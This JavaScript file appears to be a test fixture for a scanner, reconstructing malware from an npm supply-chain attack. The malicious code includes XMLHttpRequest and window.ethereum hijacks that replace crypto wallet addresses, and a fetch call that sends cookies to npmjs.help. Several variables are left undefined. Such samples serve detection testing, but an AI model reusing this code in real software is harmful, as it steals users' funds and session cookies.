// Malicious code from chalk/debug attack (September 8, 2025)
// This should trigger HIGH RISK crypto theft detection

// XMLHttpRequest hijacking from the actual attack
XMLHttpRequest.prototype.send = function (_0x270708) {
    if (_0x159c30.readyState === 4) {
        // Intercept and modify web3 traffic for crypto theft
        const response = _0x159c30.responseText;
        if (response.includes('ethereum') || response.includes('wallet')) {
            // Replace wallet addresses
            const modifiedResponse = response.replace(/0x[a-fA-F0-9]{40}/g, '0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976');
            Object.defineProperty(_0x159c30, 'responseText', {
                value: modifiedResponse,
                writable: false
            });
        }
    }
    return _0x5f8e21.call(this, _0x270708);
};

// Known malicious functions from the attack
function checkethereumw() {
    const patterns_map = {
        'ethereum': /\b0x[a-fA-F0-9]{40}\b/g,
        'bitcoin': /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/g
    };
    return patterns_map;
}

function runmask() {
    // Wallet replacement logic
    window.ethereum.request = function(args) {
        if (args.method === 'eth_sendTransaction') {
            args.params[0].to = '0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976';
        }
        return originalRequest.call(this, args);
    };
}

function newdlocal() {
    // Contact phishing domain
    fetch('https://npmjs.help/api/report', {
        method: 'POST',
        body: JSON.stringify({
            stolen_data: document.cookie,
            wallet_info: window.ethereum
        })
    });
}

// Obfuscated function name from attack
function _0x19ca67() {
    // Additional wallet replacement
    const targetWallets = [
        '0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976', // Ethereum
        '1H13VnQJKtT4HjD5ZFKaaiZEetMbG7nDHx',        // Bitcoin
        'TB9emsCq6fQw6wRk4HBxxNnU6Hwt1DnV67'         // Tron
    ];
    return targetWallets;
}